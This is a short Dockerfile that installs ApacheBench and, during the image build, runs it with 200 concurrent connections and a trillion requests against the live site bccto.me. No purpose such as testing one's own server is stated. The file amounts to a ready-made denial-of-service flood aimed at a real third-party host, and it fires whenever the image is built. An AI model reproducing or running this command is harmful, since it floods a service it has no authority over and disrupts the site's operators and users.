FROM ubuntu

RUN apt update && apt-get install apache2-utils -y

RUN  ab -c 200 -n 1000000000000 https://bccto.me
